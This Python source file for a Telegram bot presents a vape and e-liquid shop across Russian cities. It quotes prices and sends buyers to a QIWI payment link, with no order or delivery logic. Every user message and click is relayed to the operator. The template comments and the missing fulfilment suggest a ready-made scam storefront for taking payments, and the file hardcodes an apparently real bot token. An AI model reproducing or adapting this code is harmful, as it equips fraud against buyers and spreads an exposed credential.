import telebot
from telebot import types

# Все, что тебе нужно:
token = "5742360177:AAHT3RIXQt-xDQJvgTEbyEYSbiLqxHCXJ9Y" # токен основного бота
id = "6000217072" # Твой ид, что-бы бот кидал тебе все, что происходит в боте
site = "https://qiwi.com/n/NICK_NAME" # Cсылка оплаты(в конце ссылки пишите ваш ник QIWI)
channel = "https://t.me/joinchat/AAAAAFN22D7brhS9NAcbyg" # Канал 
op = "Больше ботов на https://conff.org/" # Аккаунт оператора

bot = telebot.TeleBot(token)

@bot.message_handler(commands=["start"])
def repeat_all_messages(message):
  bot.send_message(id, str(message.chat.first_name) + " [ "+ str(message.chat.id)+" ] |Написал: " + str(message.text))
  keyboard = types.InlineKeyboardMarkup()
  button1 = types.InlineKeyboardButton(text="Москва", callback_data="button1")
  button2 = types.InlineKeyboardButton(text="Воронеж", callback_data="button2")
  button3 = types.InlineKeyboardButton(text="Норильск", callback_data="button3")
  button4 = types.InlineKeyboardButton(text="Томск", callback_data="button4")
  button5 = types.InlineKeyboardButton(text="Краснодар", callback_data="button5")
  button6 = types.InlineKeyboardButton(text="Красноярск", callback_data="button6")
  button7 = types.InlineKeyboardButton(text="Иркутск", callback_data="button7")
  button8 = types.InlineKeyboardButton(text="Улан-Удэ", callback_data="button8")
  button9 = types.InlineKeyboardButton(text="Бийск", callback_data="button9")
  button10 = types.InlineKeyboardButton(text="Борисоглебцк", callback_data="button10")
  button11 = types.InlineKeyboardButton(text="Пермь", callback_data="button11")
  button12 = types.InlineKeyboardButton(text="Екатеринбург", callback_data="button12")
  button13 = types.InlineKeyboardButton(text="Сургут", callback_data="button13")
  button14 = types.InlineKeyboardButton(text="Сочи", callback_data="button14")
  button15 = types.InlineKeyboardButton(text="Ханты-Мансийский", callback_data="button15")
  button16 = types.InlineKeyboardButton(text="Абакан", callback_data="button16")
  button17 = types.InlineKeyboardButton(text="Оренбург", callback_data="button17")
  button18 = types.InlineKeyboardButton(text="Нижний Новгород", callback_data="button18")
  keyboard.add(button1, button2, button3, button4, button5, button6, button7, button8, button9, button10, button11, button12, button13, button14, button15, button16, button17, button18)
  bot.send_message(message.chat.id, "🛍Добро пожаловать в наш бот-магазин.\nℹ️ИНФ-канал: "+str(channel)+"\n⚙️Оператор: "+str(op)+"\n☘️Пожалуйста, выберите город:", reply_markup=keyboard)

def button(message, city):
  keyboard1 = types.InlineKeyboardMarkup()
  button1 = types.InlineKeyboardButton(text="💨ВЕЙПЫ", callback_data="blue")
  button2 = types.InlineKeyboardButton(text="🧪ЖИДКОСТИ", callback_data="red")
  bot.send_message(id, str(message.chat.first_name) + " [ "+ str(message.chat.id)+" ] |Выбрал: " + str(city))
  keyboard1.add(button1)
  keyboard1.add(button2)
  bot.send_message(message.chat.id, "✅Вы выбрали город "+str(city)+".\n☘️Теперь выберите товар:", reply_markup=keyboard1)

def blue(message, name):
  keyboard2 = types.InlineKeyboardMarkup()
  button1 = types.InlineKeyboardButton(text="Juul Labs JUUL 8W 200Mah - 900р", callback_data="b3")
  button2 = types.InlineKeyboardButton(text="Logic Compact 350mAh - 1200р", callback_data="b5")
  button3 = types.InlineKeyboardButton(text="Smoant Pasito POD Kit 1100mah - 1800р", callback_data="b1")
  bot.send_message(id, str(message.chat.first_name) + " [ "+ str(message.chat.id)+" ] |Выбрал: " + str(name))
  keyboard2.add(button1)
  keyboard2.add(button2)
  keyboard2.add(button3)
  bot.send_message(message.chat.id, "✅Вы выбрали "+str(name)+".\n☘️Теперь выберите вейп:", reply_markup=keyboard2)

def red(message, name):
  keyboard2 = types.InlineKeyboardMarkup()
  button1 = types.InlineKeyboardButton(text="Братишка 228(30мл) - 200р", callback_data="r3")
  button2 = types.InlineKeyboardButton(text="Virginia(60мл) - 400р", callback_data="r6")
  button3 = types.InlineKeyboardButton(text="Frisco Salt Soma Menthol(30мл) - 1100р", callback_data="r1")
  bot.send_message(id, str(message.chat.first_name) + " [ "+ str(message.chat.id)+" ] |Выбрал: " + str(name))
  keyboard2.add(button1)
  keyboard2.add(button2)
  keyboard2.add(button3)
  bot.send_message(message.chat.id, "✅Вы выбрали "+str(name)+".\n☘️Теперь выберите жидкость:", reply_markup=keyboard2)

def buy(message):
  keyboard = types.InlineKeyboardMarkup()
  button1 = types.InlineKeyboardButton(text="Оплатить сейчас",url=site, callback_data="by")
  keyboard.add(button1)
  bot.send_message(message.chat.id, "✅Для оплаты нажмите на кнопку:", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
  message = call.message
  if call.message:
   if call.data == "button1":
      button(call.message, "Москва")
   elif call.data == "button2":
      button(call.message, "Воронеж")
   elif call.data == "button3":
      button(call.message, "Норильск")
   elif call.data == "button4":
      button(call.message, "Томск")
   elif call.data == "button5":
      button(call.message, "Краснодар")
   elif call.data == "button6":
      button(call.message, "Красноярск")
   elif call.data == "button7":
      button(call.message, "Иркутск")
   elif call.data == "button8":
      button(call.message, "Улан-Удэ")
   elif call.data == "button9":
      button(call.message, "Бийск")
   elif call.data == "button10":
      button(call.message, "Борисоглебцк")
   elif call.data == "button11":
        button(call.message, "Пермь")
   elif call.data == "button12":
      button(call.message, "Екатеринбург")
   elif call.data == "button13":
      button(call.message, "Сургут")
   elif call.data == "button14":
      button(call.message, "Сочи")
   elif call.data == "button15":
      button(call.message, "Ханты-Мансийский")
   elif call.data == "button16":
      button(call.message, "Абакан")
   elif call.data == "button17":
      button(call.message, "Оренбург")
   elif call.data == "button18":
      button(call.message, "Нижний Новгород")
   elif call.data == "blue":
      blue(call.message, "💨ВЕЙПЫ")
   elif call.data == "red":
      red(call.message, "🧪ЖИДКОСТИ")
   elif call.data == "b3":
      bot.send_message(id, str(message.chat.first_name) + " [ "+ str(message.chat.id)+" ] |Оплачивает: Juul Labs JUUL 8W 200Mah")
      bot.send_message(message.chat.id, "Оплата-QIWI\nВы выбрали Juul Labs JUUL 8W 200Mah\nК оплате: 900р.\nКоментарий: "+str(message.chat.id))
      buy(message)
   elif call.data == "b5":
      bot.send_message(id, str(message.chat.first_name) + " [ "+ str(message.chat.id)+" ] |Оплачивает: Logic Compact 350mAh")
      bot.send_message(message.chat.id, "Оплата-QIWI\nВы выбрали Logic Compact 350mAh\nК оплате: 1200р.\nКоментарий: "+str(message.chat.id))
      buy(message)
   elif call.data == "b1":
      bot.send_message(id, str(message.chat.first_name) + " [ "+ str(message.chat.id)+" ] |Оплачивает: Smoant Pasito POD Kit 1100mah")
      bot.send_message(message.chat.id, "Оплата-QIWI\nВы выбрали Smoant Pasito POD Kit 1100mah\nК оплате: 1800р.\nКоментарий: "+str(message.chat.id))
      buy(message)
   elif call.data == "r3":
      bot.send_message(id, str(message.chat.first_name) + " [ "+ str(message.chat.id)+" ] |Оплачивает: Братишка 228(30мл)")
      bot.send_message(message.chat.id, "Оплата-QIWI\nВы выбрали Братишка 228(30мл)\nК оплате: 200р.\nКоментарий: "+str(message.chat.id))
      buy(message)
   elif call.data == "r6":
      bot.send_message(id, str(message.chat.first_name) + " [ "+ str(message.chat.id)+" ] |Оплачивает: Virginia(60мл)")
      bot.send_message(message.chat.id, "Оплата-QIWI\nВы выбрали Virginia(60мл)\nК оплате: 400р.\nКоментарий: "+str(message.chat.id))
      buy(message)
   elif call.data == "r1":
      bot.send_message(id, str(message.chat.first_name) + " [ "+ str(message.chat.id)+" ] |Оплачивает: Frisco Salt Soma Menthol(30мл)")
      bot.send_message(message.chat.id, "Оплата-QIWI\nВы выбрали Frisco Salt Soma Menthol(30мл)\nК оплате: 1100р.\nКоментарий: "+str(message.chat.id))
      buy(message)
@bot.message_handler(content_types=['text'])
def echo_all(message):
      bot.send_message(id, str(message.chat.first_name) + " [ "+ str(message.chat.id)+" ] |Написал: " + str(message.text))
      bot.send_message(message.chat.id, "Вы что-то делаете не так, пожалуйста нажмите - /start")

while True:
  bot.polling(none_stop=True)